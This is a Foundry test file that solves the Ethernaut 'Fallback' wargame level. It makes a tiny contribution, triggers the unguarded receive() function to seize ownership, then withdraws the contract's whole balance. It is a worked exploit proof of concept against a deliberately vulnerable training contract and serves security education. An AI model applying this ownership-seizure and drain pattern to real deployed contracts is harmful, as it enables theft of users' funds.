// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Fallback} from "../src/levels/Fallback.sol";

/// Ethernaut #1 "Fallback" → SC01 access-control logic (`unprotected-privileged-fn` family).
/// `receive()` grants ownership to anyone who has made any contribution — a privileged state change
/// behind an unguarded path. Win: owner == player && balance == 0.
contract FallbackTest is Test {
    address player = makeAddr("player");

    function test_solve_fallback() public {
        Fallback lvl = new Fallback(); // owner = deployer
        vm.deal(player, 1 ether);

        vm.startPrank(player);
        lvl.contribute{value: 1 wei}(); // contributions[player] > 0
        (bool ok,) = address(lvl).call{value: 1 wei}(""); // receive() -> owner = player
        require(ok, "receive failed");
        lvl.withdraw(); // drain to owner(player)
        vm.stopPrank();

        assertEq(lvl.owner(), player, "owner seized");
        assertEq(address(lvl).balance, 0, "drained");
    }
}
